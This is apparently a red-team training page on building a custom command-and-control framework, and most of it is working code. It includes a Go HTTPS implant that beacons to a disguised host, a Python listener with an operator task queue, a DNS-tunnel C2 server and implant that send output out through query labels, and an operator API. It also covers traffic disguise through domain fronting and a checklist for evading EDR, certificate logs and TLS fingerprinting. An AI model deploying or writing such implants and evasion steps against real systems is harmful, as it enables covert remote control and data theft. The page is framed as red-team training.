---
layout: training-page
title: "Custom C2 Framework Design — Red Team Academy"
module: "Tool Development"
tags:
  - c2
  - command-and-control
  - implant
  - listener
  - protocol-design
  - operator-api
  - tool-dev
  - infrastructure
page_key: "tool-dev-custom-c2-design"
render_with_liquid: false
updated: "2026-05-13"
---

# Custom C2 Framework Design

Building a custom C2 framework is one of the most valuable investments a red team can make. Commercial frameworks (Cobalt Strike, Brute Ratel) are well-understood by defenders — their network signatures, beacon intervals, and staging behaviors are fingerprinted in threat intel feeds. A custom framework, by definition, has no public signatures. This page covers the architectural decisions, protocol design, and implementation patterns used in production custom C2 systems, from implant communication to operator session management.

---

## C2 Architecture Overview

A C2 framework has three planes of interaction:

```
┌─────────────────────────────────────────────────────────────────────┐
│  OPERATOR PLANE                                                     │
│  Team Server (central) ←→ Operator clients (CLI/web UI)            │
│  Session state, tasking queue, output storage                       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │  HTTP/S, gRPC (internal)
┌──────────────────────────▼──────────────────────────────────────────┐
│  LISTENER PLANE                                                     │
│  Listener(s) — receive and decrypt implant check-ins               │
│  May be co-located with team server or separate (redirectors)       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │  Protocol varies (HTTP/S, DNS, ICMP, SMB)
┌──────────────────────────▼──────────────────────────────────────────┐
│  IMPLANT PLANE                                                      │
│  Implant(s) running on target — polls for tasks, returns output    │
│  Stageless (full implant) or staged (stager → full agent)          │
└─────────────────────────────────────────────────────────────────────┘
```

### Design Decisions Matrix

| Decision | Options | Trade-off |
|---|---|---|
| Protocol | HTTP/S, DNS, ICMP, SMB, custom | HTTP/S: easy to proxy; DNS: bypasses firewalls; SMB: LAN-only lateral |
| Staging | Stageless vs staged | Stageless: larger but simpler; staged: smaller stager but two-stage detection surface |
| Encryption | AES-GCM, ChaCha20, custom | AES-GCM: hardware-accelerated, authenticated; custom: unique signature |
| Authentication | HMAC, mutual TLS, pre-shared key | HMAC: simple; mTLS: strongest; PSK: easiest to implement |
| Check-in model | Polling vs push | Polling: no inbound firewall holes; push: lower latency |
| Jitter | Fixed interval + ±jitter% | Humanised sleep patterns evade beacon timing detection |

---

## Protocol Design: HTTP/S Beacon

HTTP/S is the most operationally reliable protocol. The implant makes HTTP requests that blend with normal web traffic when the C2 is configured with a plausible server persona.

```
# HTTP beacon protocol — request/response structure

# Check-in GET (implant → server):
GET /api/v2/telemetry/upload HTTP/1.1
Host: updates.cdn-delivery.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookie: session=<base64(encrypted_beacon_id + timestamp + hmac)>
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest

# Server response (tasks or empty 200):
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{"data": "<base64(AES-GCM(task_blob))>"}
# OR empty task:
{"data": ""}

# Task output POST (implant → server):
POST /api/v2/telemetry/upload HTTP/1.1
Host: updates.cdn-delivery.net
Content-Type: application/x-www-form-urlencoded

data=<base64(AES-GCM(output_blob))>&token=<hmac>
```

```go
// Go: implant check-in loop with jitter and encryption
// Production pattern: AES-256-GCM encryption, HMAC authentication
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/hmac"
    "crypto/rand"
    "crypto/sha256"
    "crypto/tls"
    "encoding/base64"
    "io"
    "math/big"
    mathrand "math/rand"
    "net/http"
    "time"
)

const (
    c2URL      = "https://updates.cdn-delivery.net"
    checkInPath = "/api/v2/telemetry/upload"
    sleepBase  = 60  // seconds
    jitterPct  = 25  // ±25% jitter
)

// Pre-shared key — 32 bytes for AES-256 and HMAC-SHA256
// In production: derive from a password or embed securely
var psk = []byte{0x01, 0x02, /* ... 32 bytes */}

func jitterSleep(base int, pct int) {
    delta := float64(base) * (float64(pct) / 100.0)
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(delta*2)))
    jitter := n.Int64() - int64(delta)
    sleep := time.Duration(int64(base)+jitter) * time.Second
    _ = mathrand.Int()  // keep math/rand import satisfied
    time.Sleep(sleep)
}

func encrypt(plaintext []byte) (string, error) {
    block, err := aes.NewCipher(psk[:32])
    if err != nil { return "", err }
    gcm, err := cipher.NewGCM(block)
    if err != nil { return "", err }
    nonce := make([]byte, gcm.NonceSize())
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil { return "", err }
    ct := gcm.Seal(nonce, nonce, plaintext, nil)
    return base64.StdEncoding.EncodeToString(ct), nil
}

func decrypt(ciphertext string) ([]byte, error) {
    raw, err := base64.StdEncoding.DecodeString(ciphertext)
    if err != nil { return nil, err }
    block, err := aes.NewCipher(psk[:32])
    if err != nil { return nil, err }
    gcm, err := cipher.NewGCM(block)
    if err != nil { return nil, err }
    ns := gcm.NonceSize()
    return gcm.Open(nil, raw[:ns], raw[ns:], nil)
}

func makeHMAC(data []byte) string {
    mac := hmac.New(sha256.New, psk)
    mac.Write(data)
    return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

var client = &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
    Timeout: 30 * time.Second,
}

func checkIn(beaconID string) ([]byte, error) {
    ts := []byte(time.Now().UTC().Format(time.RFC3339))
    cookie := base64.StdEncoding.EncodeToString(append([]byte(beaconID+"|"), ts...))
    hmacVal := makeHMAC([]byte(cookie))

    req, _ := http.NewRequest("GET", c2URL+checkInPath, nil)
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    req.Header.Set("Cookie", "session="+cookie+"; hmac="+hmacVal)
    req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
    req.Header.Set("X-Requested-With", "XMLHttpRequest")

    resp, err := client.Do(req)
    if err != nil { return nil, err }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)
    return body, nil
}

func sendOutput(beaconID string, output []byte) error {
    enc, err := encrypt(output)
    if err != nil { return err }
    body := bytes.NewBufferString("data=" + enc + "&token=" + makeHMAC(output))
    req, _ := http.NewRequest("POST", c2URL+checkInPath, body)
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    _, err = client.Do(req)
    return err
}
```

---

## C2 Server: Listener & Task Queue

```python
#!/usr/bin/env python3
"""
c2_server.py — minimal custom C2 listener + task queue
Production-grade additions: database backend, TLS certificate pinning,
rate limiting, operator authentication, multi-listener support.
"""
import base64
import hmac
import hashlib
import json
import os
import queue
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

# Pre-shared key (must match implant)
PSK = os.environ.get("C2_PSK", "changeme_32_byte_key_00000000!!").encode()[:32]

# In-memory beacon registry: {beacon_id: {last_seen, metadata}}
beacons: dict = {}
# Task queues: {beacon_id: queue.Queue}
task_queues: dict = {}
# Output storage: {beacon_id: list of {task_id, output, timestamp}}
output_store: dict = {}
lock = threading.Lock()

def hmac_verify(data: bytes, token: str) -> bool:
    expected = base64.b64encode(
        hmac.new(PSK, data, hashlib.sha256).digest()
    ).decode()
    return hmac.compare_digest(expected, token)

def decrypt(ciphertext_b64: str) -> bytes:
    """AES-256-GCM decrypt (matches Go encrypt function above)"""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    raw = base64.b64decode(ciphertext_b64)
    nonce, ct = raw[:12], raw[12:]
    aesgcm = AESGCM(PSK)
    return aesgcm.decrypt(nonce, ct, None)

def encrypt(plaintext: bytes) -> str:
    """AES-256-GCM encrypt"""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import os
    nonce = os.urandom(12)
    aesgcm = AESGCM(PSK)
    ct = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ct).decode()

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        # Suppress default access logs (use structured logging instead)
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{ts}] {fmt % args}")

    def do_GET(self):
        if self.path != "/api/v2/telemetry/upload":
            self._send(404, b"Not Found")
            return

        # Parse session cookie for beacon ID
        cookie_header = self.headers.get("Cookie", "")
        session_val, hmac_val = "", ""
        for part in cookie_header.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "session": session_val = v
            if k == "hmac": hmac_val = v

        if not hmac_verify(session_val.encode(), hmac_val):
            self._send(403, b"Forbidden")
            return

        # Decode beacon ID from session
        try:
            decoded = base64.b64decode(session_val).decode()
            beacon_id = decoded.split("|")[0]
        except Exception:
            self._send(400, b"Bad Request")
            return

        # Register beacon
        with lock:
            if beacon_id not in beacons:
                beacons[beacon_id] = {"first_seen": datetime.utcnow().isoformat()}
                task_queues[beacon_id] = queue.Queue()
                output_store[beacon_id] = []
                print(f"[+] New beacon: {beacon_id}")
            beacons[beacon_id]["last_seen"] = datetime.utcnow().isoformat()

        # Dequeue next task if available
        task_data = ""
        with lock:
            if not task_queues[beacon_id].empty():
                task = task_queues[beacon_id].get_nowait()
                task_data = encrypt(json.dumps(task).encode())
                print(f"[>] Tasking {beacon_id}: {task}")

        resp = json.dumps({"data": task_data}).encode()
        self._send(200, resp, "application/json")

    def do_POST(self):
        if self.path != "/api/v2/telemetry/upload":
            self._send(404, b"Not Found")
            return

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = dict(p.split("=", 1) for p in body.split("&") if "=" in p)

        data_enc = params.get("data", "")
        token    = params.get("token", "")

        if not data_enc:
            self._send(400, b"Bad Request")
            return

        try:
            output = decrypt(data_enc)
            print(f"[<] Output received: {output[:200]}")
        except Exception as e:
            print(f"[!] Decrypt failed: {e}")
            self._send(400, b"Bad Request")
            return

        self._send(200, b'{"status":"ok"}', "application/json")

    def _send(self, code: int, body: bytes, ct: str = "text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "nginx/1.24.0")  # lie about server type
        self.end_headers()
        self.wfile.write(body)

def operator_shell():
    """Simple operator interface — in production replace with a proper gRPC/REST API"""
    print("C2 operator shell. Commands: list, task <id> <cmd>, output <id>, quit")
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if line == "list":
            with lock:
                for bid, meta in beacons.items():
                    print(f"  {bid}  last_seen={meta.get('last_seen', '?')}")

        elif line.startswith("task "):
            parts = line.split(None, 2)
            if len(parts) == 3:
                _, bid, cmd = parts
                with lock:
                    if bid in task_queues:
                        task_queues[bid].put({"id": os.urandom(4).hex(), "cmd": cmd})
                        print(f"[+] Queued: {cmd} → {bid}")
                    else:
                        print(f"[!] Unknown beacon: {bid}")

        elif line.startswith("output "):
            _, bid = line.split(None, 1)
            with lock:
                for entry in output_store.get(bid, []):
                    print(entry)

        elif line == "quit":
            break

if __name__ == "__main__":
    port = int(os.environ.get("C2_PORT", 443))
    server = HTTPServer(("0.0.0.0", port), C2Handler)
    print(f"[*] C2 listener on 0.0.0.0:{port}")
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    operator_shell()
    server.shutdown()
```

---

## DNS C2 Channel

DNS is the highest-survivability C2 protocol: it traverses nearly every firewall, proxy, and network segmentation boundary because DNS traffic is rarely blocked and often poorly monitored. The tradeoff is low bandwidth (~40-60 bytes per query).

```python
# dns_c2_server.py — DNS TXT record-based C2 channel
# Implant encodes tasks/output as DNS queries; server responds with TXT records
# Uses dnslib for DNS packet handling

from dnslib import DNSRecord, QTYPE, RR, TXT
from dnslib.server import DNSServer, BaseResolver
import base64
import queue
import threading

DOMAIN = "updates.telemetry-api.com"    # your C2 domain (NS record points here)
task_queues = {}    # beacon_id → queue.Queue of task chunks
output_buf  = {}    # beacon_id → accumulated output bytes

def decode_label(label: str) -> bytes:
    """Decode base32-encoded data from a DNS label"""
    # DNS labels are case-insensitive; base32 uses A-Z, 2-7
    # Replace separators to get valid base32
    padded = label.upper().replace("-", "")
    pad = (8 - len(padded) % 8) % 8
    return base64.b32decode(padded + "=" * pad)

class C2Resolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        labels = qname.split(".")

        # Protocol: <type>.<beacon_id>.<data>.c2domain.com
        # type: "i" = check-in, "d" = data chunk, "e" = end of output
        if len(labels) < 4 or not qname.endswith(DOMAIN):
            return request.reply()

        msg_type  = labels[0]       # i / d / e
        beacon_id = labels[1]       # 8-char hex ID
        data_enc  = labels[2] if len(labels) > 4 else ""

        reply = request.reply()

        if msg_type == "i":  # check-in — return next task encoded as TXT
            if beacon_id not in task_queues:
                task_queues[beacon_id] = queue.Queue()
                print(f"[+] New beacon: {beacon_id}")

            if not task_queues[beacon_id].empty():
                task = task_queues[beacon_id].get_nowait()
                # Encode task as base32 for DNS-safe transport
                encoded = base64.b32encode(task.encode()).decode().lower()
                # Split into 63-char chunks (DNS label max length)
                chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
                txt = " ".join(chunks)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(txt), ttl=1))

        elif msg_type == "d":  # data chunk from implant
            if data_enc:
                chunk = decode_label(data_enc)
                output_buf.setdefault(beacon_id, b"")
                output_buf[beacon_id] += chunk

        elif msg_type == "e":  # end of output transmission
            output = output_buf.pop(beacon_id, b"")
            print(f"[<] Output from {beacon_id}: {output.decode(errors='replace')}")

        return reply

resolver = C2Resolver()
server   = DNSServer(resolver, port=53, address="0.0.0.0")
server.start_thread()
print(f"[*] DNS C2 listening on UDP/53 for {DOMAIN}")
```

```go
// Go: DNS C2 implant stub — encodes check-in and output as DNS queries
// Requires github.com/miekg/dns
package main

import (
    "encoding/base32"
    "fmt"
    "strings"

    "github.com/miekg/dns"
)

const (
    c2Domain = "updates.telemetry-api.com"
    beaconID = "deadbeef"  // generated uniquely per implant
    dnsServer = "8.8.8.8:53"  // or your ISP's resolver — not the C2 directly
)

func dnsQuery(name string) (string, error) {
    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(name), dns.TypeTXT)
    c := new(dns.Client)
    r, _, err := c.Exchange(m, dnsServer)
    if err != nil { return "", err }
    for _, ans := range r.Answer {
        if txt, ok := ans.(*dns.TXT); ok {
            return strings.Join(txt.Txt, ""), nil
        }
    }
    return "", nil
}

func checkIn() (string, error) {
    // Send check-in query: i.<beaconid>.noop.<c2domain>
    fqdn := fmt.Sprintf("i.%s.noop.%s", beaconID, c2Domain)
    return dnsQuery(fqdn)
}

func sendOutput(output string) {
    // Base32-encode output, split into 30-byte chunks (safe DNS label size)
    enc := base32.StdEncoding.EncodeToString([]byte(output))
    enc = strings.ToLower(strings.TrimRight(enc, "="))
    chunk_size := 30
    for i := 0; i < len(enc); i += chunk_size {
        end := i + chunk_size
        if end > len(enc) { end = len(enc) }
        chunk := enc[i:end]
        fqdn := fmt.Sprintf("d.%s.%s.%s", beaconID, chunk, c2Domain)
        dnsQuery(fqdn)
    }
    // Send end-of-transmission marker
    dnsQuery(fmt.Sprintf("e.%s.fin.%s", beaconID, c2Domain))
}
```

---

## Malleable Profiles: Customising Network Signatures

A malleable profile defines the HTTP transaction shape — headers, URIs, cookies, body encoding — so the beacon traffic resembles a specific legitimate application. The concept originates in Cobalt Strike's Malleable C2 but applies to any HTTP C2.

```
# Profile design principles:
#
# 1. Mimic a real application's traffic patterns
#    - Choose a category: CDN heartbeat, analytics ping, telemetry upload
#    - Match realistic User-Agent, Accept, and Content-Type headers
#    - Use plausible URI paths (not /beacon/checkin)
#
# 2. Match body encoding to the persona
#    - JSON API: {"data":"<b64>","ts":1234567890}
#    - Form post: data=<url-encoded-b64>&session=<token>
#    - Multipart: mimic a file upload
#
# 3. Realistic sleep intervals
#    - Analytics pings: 30-60s with ±20% jitter
#    - CDN heartbeats: 300s intervals
#    - Don't beacon faster than the application you're mimicking
#
# 4. HTTP response codes
#    - 200 with task data
#    - 200 with empty body for "no task" (not 204 — that's unusual for a CDN API)
#    - Realistic error responses if path/method doesn't match

# Example: mimic Google Analytics collect endpoint
GET /collect?v=1&tid=UA-XXXXXXXX-1&cid=<beacon_id>&t=pageview&dp=%2F
Host: www.google-analytics.com  # (domain-fronted — real front domain)
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: https://www.legitcorp.com/products
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
```

---

## Operator API Design

```python
# operator_api.py — RESTful operator API using FastAPI
# In production: add mutual TLS, operator authentication, audit logging
from fastapi import FastAPI, Depends, HTTPException, Header
from pydantic import BaseModel
import secrets

app = FastAPI(docs_url=None, redoc_url=None)  # disable Swagger in prod

OPERATOR_TOKENS = {"operator1": secrets.token_hex(32)}  # load from secrets manager

def verify_token(authorization: str = Header()):
    scheme, _, token = authorization.partition(" ")
    if scheme.lower() != "bearer" or token not in OPERATOR_TOKENS.values():
        raise HTTPException(status_code=401, detail="Unauthorized")

class TaskRequest(BaseModel):
    beacon_id: str
    command: str
    args: list[str] = []

@app.get("/api/beacons", dependencies=[Depends(verify_token)])
def list_beacons():
    with lock:
        return [{"id": bid, **meta} for bid, meta in beacons.items()]

@app.post("/api/task", dependencies=[Depends(verify_token)])
def queue_task(req: TaskRequest):
    with lock:
        if req.beacon_id not in task_queues:
            raise HTTPException(404, "Beacon not found")
        task_queues[req.beacon_id].put({
            "id": secrets.token_hex(4),
            "cmd": req.command,
            "args": req.args
        })
    return {"status": "queued"}

@app.get("/api/output/{beacon_id}", dependencies=[Depends(verify_token)])
def get_output(beacon_id: str):
    with lock:
        return output_store.get(beacon_id, [])
```

---

## Detection Avoidance Checklist

```
C2 infrastructure OPSEC — what blue teams look for and how to avoid it:

[Network level]
□ Certificate transparency logs
  — Don't use LetsEncrypt for C2 certs: logged publicly, trivial to correlate
  — Buy a cert from a reseller, or use self-signed + pin in implant
□ JA3/JA3S TLS fingerprinting
  — Default Go/Python TLS stacks produce distinctive JA3 hashes
  — Mitigation: use a custom cipher suite order, or front with a CDN
□ Beacon timing regularity
  — Fixed 60s intervals detected by timing analysis (Zeek, Bro scripts)
  — Mitigation: ±25-40% jitter minimum; long-haul sleep on weekends
□ Domain age and reputation
  — Fresh domains (<30 days) are flagged by proxy appliances
  — Buy domains 60+ days before use; add benign content first
□ URI path patterns
  — /beacon, /checkin, /implant, /gate.php are all flagged
  — Use plausible application paths with query parameters
□ HTTP header ordering
  — Custom header order differs from browsers; some NDR tools fingerprint this
  — Match a real browser's header order exactly

[Host level]
□ Process names
  — svchost.exe, RuntimeBroker.exe for injection targets (suspicious without parent)
  — Better: inject into a process the user actually runs (browser, office app)
□ Child process chains
  — cmd.exe / powershell.exe spawned by non-typical parents triggers EDR
  — Use shellcode execution or BOFs rather than spawning processes
□ Disk artifacts
  — Stageless implants written to %TEMP%, %APPDATA% trigger on-write scans
  — Execute from memory; use reflective loading patterns
□ Network connections
  — Implant process making direct external connections is a strong signal
  — Use process injection to make connections from a browser process
```

---

## Reference Implementations

| Project | Language | Notes |
|---|---|---|
| [Sliver](https://github.com/BishopFox/sliver) | Go | Open-source; study its protocol and session handling |
| [Havoc](https://github.com/HavocFramework/Havoc) | C/C++/Python | Daemon + teamserver; modern architecture |
| [Merlin](https://github.com/Ne0nd0g/merlin) | Go | HTTP/2, QUIC support; good protocol study |
| [XTAC](https://github.com/EspressoCake/XTAC) | Go/C++ | Minimal BOF-compatible implant |
| [NimPlant](https://github.com/chvancooten/NimPlant) | Nim/Python | Nim implant, Python C2 — matches this module's languages |
